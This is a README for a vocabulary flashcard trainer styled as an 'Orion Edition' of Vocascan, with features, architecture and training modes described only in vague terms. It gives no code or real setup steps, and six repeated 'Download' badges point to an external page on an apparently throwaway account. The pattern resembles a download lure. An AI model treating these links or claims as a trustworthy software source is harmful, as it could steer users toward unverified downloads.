![preview](https://raw.githubusercontent.com/emilznyk0-dotcom/vocascan-flashcards/main/card_62ed3.svg)
[![Download](https://raw.githubusercontent.com/emilznyk0-dotcom/vocascan-flashcards/main/app_da23f17.svg)](https://emilznyk0-dotcom.github.io/vocascan-flashcards/)

# Vocascan Frontend — Orion Edition 🛰️

A configurable vocabulary trainer that treats language learning like charting constellations — every word a star, every deck a sky map. This frontend is the observation deck of the Vocascan ecosystem, a modular client built for learners who want their vocabulary drills shaped around their own habits rather than the other way around.

The Orion Edition rebuilds the original training loop from the ground up: a renderer-agnostic component layer, a state machine that survives long study sessions, and a theming engine that lets every learner carve out their own corner of the interface. Whether you are memorizing medical terminology, travel phrases, or script characters from a language with no Latin alphabet, the trainer adapts its cards, intervals, and prompts to match.

[![Download](https://raw.githubusercontent.com/emilznyk0-dotcom/vocascan-flashcards/main/app_da23f17.svg)](https://emilznyk0-dotcom.github.io/vocascan-flashcards/)

---

## 📡 Table of Contents

- [Why This Exists](#-why-this-exists)
- [Feature Highlights](#-feature-highlights)
- [Architecture Overview](#-architecture-overview)
- [Training Modes](#-training-modes)
- [Deck and Card Model](#-deck-and-card-model)
- [Responsive Interface Philosophy](#-responsive-interface-philosophy)
- [Multilingual Support](#-multilingual-support)
- [Theming and Accessibility](#-theming-and-accessibility)
- [Offline Behavior](#-offline-behavior)
- [Integrations and API Surface](#-integrations-and-api-surface)
- [Project Structure](#-project-structure)
- [Local Development Environment](#-local-development-environment)
- [Environment Configuration](#-environment-configuration)
- [Quality Gates](#-quality-gates)
- [Performance Notes](#-performance-notes)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Community and Support](#-community-and-support)
- [Contributing](#-contributing)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌌 Why This Exists

Most vocabulary trainers assume a single rhythm: show a card, flip it, grade yourself, move on. That rhythm works for a while, then it stops matching how people actually study. Some learners want strict spaced repetition. Others want rapid-fire recognition drills for a placement exam on Thursday. Others want to rehearse pronunciation while walking to class.

Vocascan Frontend — Orion Edition exists because a training client should be a set of instruments, not a single dial. The interface is intentionally opinionated about clarity and deliberately flexible about workflow. You can run it as a lightweight recognition drill, a full audit of a 4,000-word deck, or a background session that only surfaces cards you have historically struggled with.

The name Orion is a nod to the constellation metaphor that runs through the entire project: a small number of bright reference points, connected by lines that only make sense once you step back and look at the whole sky.

---

## ✨ Feature Highlights

Each item below reflects a capability that ships in the current line, not an aspiration.

- **Adaptive Training Engine** — scheduling logic that blends interval-based repetition with confidence-weighted prioritization, tuned per deck.
- **Deck Importers with Mapping Rules** — bring in structured word lists and define how columns map to prompts, answers, hints, and tags.
- **Responsive UI Across Form Factors** — a single layout system that reflows from ultrawide desktop study setups down to a phone held in one hand on a train.
- **Multilingual Support from the Interface Down** — UI strings, card content, right-to-left scripts, and input methods handled as first-class concerns.
- **Keyboard-First Navigation** — full training sessions completable without touching a pointer; every control is reachable through a documented key sequence.
- **Session Analytics Without Noise** — accuracy, streak, and time-per-card trends presented as a small number of legible charts rather than a wall of numbers.
- **Custom Study Plans** — plan definitions that specify deck subsets, daily ceilings, and cooldown windows.
- **Theming Engine** — light, dark, high-contrast, and user-authored palettes applied through design tokens.
- **24/7 Support Channel** — a monitored help desk for setup questions, data recovery on imports, and accessibility reports.
- **Progressive Web Delivery** — installable behavior with cached decks so a session can continue through a dropped connection.
- **Audit Trail for Deck Edits** — every card mutation is recorded with a timestamp so a bad bulk edit can be traced and reversed.
- **Peer Review Mode** — share a deck in read-only review state and gather structured feedback before publishing it broadly.

[![Download](https://raw.githubusercontent.com/emilznyk0-dotcom/vocascan-flashcards/main/app_da23f17.svg)](https://emilznyk0-dotcom.github.io/vocascan-flashcards/)

---

## 🧭 Architecture Overview

The frontend is organized as a layered application, deliberately avoiding a monolith view layer. The layers are:

**Presentation Layer** — route-level views and shared layout primitives. This layer knows about the design token system and nothing about scheduling.

**Interaction Layer** — the training state machine. It consumes card events (presented, answered, skipped, timed out) and emits transitions. This is where session rules live.

**Domain Layer** — deck, card, plan, and session models with their validation rules. Pure functions, easy to test, no rendering knowledge.

**Data Access Layer** — adapters that talk to the Vocascan backend or to a local persistence store. Adapters are swappable so the trainer runs against a mock during development.

**Platform Layer** — storage, notifications, clipboard, and offline caching. Each platform capability has a narrow interface and a browser implementation.

This separation keeps the scheduling brain portable. If the interface layer is ever replaced, the training logic survives intact.

---

## 🎯 Training Modes

Training modes are configurations of the same state machine, not separate code paths. That means analytics collected in one mode remain comparable to another.

### Recognition Drill
A card is shown in the source language and you select or type the target. Feedback arrives instantly. Best for high-volume warmups before a longer session.

### Recall Practice
The target language appears first and you must produce the source. This is the harder direction and typically surfaces weaknesses that recognition drills mask.

### Mixed Interleaving
The engine alternates directions and occasionally injects a card from a different deck to test discrimination. Interleaving reduces the illusion of fluency that comes from studying a single list in order.

### Timed Sprint
A fixed window, usually five to ten minutes, with a soft target. Designed for learners who study in small pockets of time and want a bounded commitment.

### Weak-Spot Focus
Only cards whose historical accuracy falls below a configured threshold are presented. Ideal the day before an assessment.

### Audio-First Review
Cards play their attached audio and you respond before revealing the written form. Useful for tonal languages and for building listening reflexes.

---

## 🗂️ Deck and Card Model

A deck is a container with metadata: name, description, source language, target language, tags, and a visibility setting. A card belongs to exactly one deck and carries:

- A prompt field, in the source language
- An answer field, in the target language
- Zero or more accepted alternates for flexible grading
- An optional hint that can be revealed without penalty
- An optional audio attachment reference
- A tag set for filtering within a deck
- Scheduling state: interval, ease, last review, next review, lapse count

Cards can be edited individually or through bulk operations. Bulk edits run through a dry-run preview so a misconfigured find-and-replace can be inspected before it commits.

---

## 📱 Responsive Interface Philosophy

Responsiveness is treated as more than breakpoints. The layout system defines three behavioral postures:

**Workbench Posture** — large viewport, pointer and keyboard. Multiple panels visible simultaneously: deck navigator, current card, session statistics.

**Focused Posture** — tablet-sized viewport. The card occupies the center; navigation collapses into a rail.

**Pocket Posture** — small viewport. One thing at a time. Swipe gestures map to grade actions, and the session statistics become a compact header strip.

The design tokens that drive spacing, radius, and type scale shift per posture, so the interface feels intentionally designed at each size rather than merely squeezed.

---

## 🌍 Multilingual Support

Two distinct concepts are handled separately:

**Interface Localization** — the language of buttons, labels, empty states, and error messages. Translation catalogs are versioned alongside the code and validated for missing keys during the build.

**Content Language Handling** — the languages being studied. This includes correct font selection for scripts outside the Latin range, bidirectional text layout, and input method support for composing characters that require multiple keystrokes.

Language metadata lives in a single registry that describes script direction, preferred fonts, and any special input requirements. Adding a new content language usually means adding an entry to that registry plus any font assets it requires.

---

## 🎨 Theming and Accessibility

Themes are defined as token sets, not as scattered style overrides. A theme specifies palette, contrast level, motion preference, and focus ring style. Users can author their own token sets and share them as small configuration files.

Accessibility commitments:

- Every interactive element is reachable and operable by keyboard.
- Focus is always visible and never trapped unexpectedly.
- Color is never the only signal; correctness feedback pairs color with iconography and text.
- Reduced motion preference is respected throughout, including in chart transitions.
- Screen reader announcements are emitted for card changes and grading outcomes.
- Contrast ratios meet or exceed the stricter tier for text and controls.

Accessibility issues are treated as defects, not enhancements, and are triaged with the same urgency as crashes.

---

## 🔌 Offline Behavior

The trainer caches the active deck set and the current session plan. When connectivity drops mid-session, training continues and the pending results queue locally. On reconnection, the queue is replayed against the backend with conflict resolution rules that favor the most recent local grading event for each card.

If a deck was updated remotely while offline, the client surfaces a reconciliation prompt rather than silently overwriting either side.

---

## 🔗 Integrations and API Surface

The frontend communicates through a documented HTTP interface. Key resource groups:

- Decks: create, read, update, archive, and share
- Cards: batch insert, batch update, single delete
- Sessions: begin, submit results, fetch history
- Plans: define, adjust, and query adherence
- Analytics: per-deck and per-session aggregates

The client is written against an interface description, which means a compatible backend can be implemented independently. A mock server ships with the repository for frontend-only development.

---

## 🧱 Project Structure

A high-level map of the repository, without exhaustive file listings:

- Application entry and routing configuration
- Shared layout and navigation primitives
- Training state machine and session orchestration
- Domain models for decks, cards, plans, and sessions
- Data access adapters, including the mock server binding
- Design token definitions and theme presets
- Localization catalogs and the language registry
- Test utilities and fixtures for deck generation
- Documentation for contributors and integrators

---

## 🛠️ Local Development Environment

Set up a working environment in a few steps. The project targets a current long-term-support runtime for the toolchain and a modern browser for the client.

1. Ensure a compatible runtime is available on your machine.
2. Obtain the source from the project's primary repository location.
3. Provide a configuration file describing the backend endpoint and any feature flags you want enabled.
4. Launch the development server and open the indicated local address.
5. Point the client at the bundled mock server if you do not have a backend running.

The development server supports hot module replacement for the interaction layer, so training state machine changes can be exercised without a full reload.

[![Download](https://raw.githubusercontent.com/emilznyk0-dotcom/vocascan-flashcards/main/app_da23f17.svg)](https://emilznyk0-dotcom.github.io/vocascan-flashcards/)

---

## ⚙️ Environment Configuration

Configuration is read from a single file at startup. Representative settings include:

- Backend base address
- Mock server toggle for offline development
- Default interface locale
- Default content language pair
- Feature flags for experimental training modes
- Telemetry opt-in state
- Session autosave interval

Secrets are never committed. Any credential material required for a hosted deployment is injected by the deployment environment, not stored in the repository.

---

## ✅ Quality Gates

Before a change is accepted, it must pass:

- Type checking across the application source
- Unit tests for the domain and interaction layers
- Component tests covering interactive states
- Accessibility checks on key routes
- Localization key validation
- Bundle size budget verification

These gates run automatically on every proposed change. A failing gate blocks integration until addressed or explicitly waived with a documented rationale.

---

## 🚀 Performance Notes

Performance is measured on mid-range hardware, not on the fastest available machine. Focus areas:

- Initial route load stays within a defined budget.
- Card transitions never block the main thread for perceptible durations.
- Large decks are virtualized so scrolling remains smooth regardless of deck size.
- Analytics aggregation runs off the critical path and results are cached.
- Theme switching applies through token updates rather than full restyles.

---

## 🗓️ Roadmap for 2026

Planned work for the year ahead, subject to community input:

- Expanded import mapping presets for common word list shapes
- Collaborative deck editing with presence indicators
- Pronunciation scoring using on-device models where available
- A plugin surface for custom card renderers
- Additional interface locales driven by community translations
- Study plan templates for exam-focused learners
- A structured export format for long-term data portability

---

## 🤝 Community and Support

Support is available around the clock through the project's monitored help channel. Typical response windows are short, and accessibility or data-integrity reports are prioritized. Community discussions cover study technique, deck curation, and integration questions.

Users are encouraged to share deck configurations and theme token sets. Shared content is reviewed for correctness before it is featured.

---

## 🧩 Contributing

Contributions of all sizes are welcome, from typo fixes to new training modes. A few expectations:

- Discuss significant changes before building them, so effort is not duplicated.
- Keep domain logic free of rendering concerns.
- Add tests for behavior changes, especially in the interaction layer.
- Follow the established naming and localization conventions.
- Keep accessibility a first-class consideration from the start.

A contributor guide in the repository documentation covers branch conventions, review expectations, and the release cadence.

---

## ⚠️ Disclaimer

This project is provided as-is for educational and personal study purposes. Scheduling results, accuracy statistics, and retention estimates are informational and should not be treated as professional linguistic assessment or certification. Learners preparing for formal examinations should consult official syllabi and instructors. The maintainers are not responsible for data loss resulting from improper import mappings, unsupported browser versions, or deployment misconfiguration. Always keep independent backups of deck data you consider irreplaceable. Training progress depends on consistent practice; no tool can substitute for regular study.

---

## 📜 License

This project is distributed under the MIT License. The full license text is available at the repository's LICENSE file, which can be reviewed here: [MIT License](LICENSE).

Copyright (c) 2026 Vocascan Frontend — Orion Edition contributors.

[![Download](https://raw.githubusercontent.com/emilznyk0-dotcom/vocascan-flashcards/main/app_da23f17.svg)](https://emilznyk0-dotcom.github.io/vocascan-flashcards/)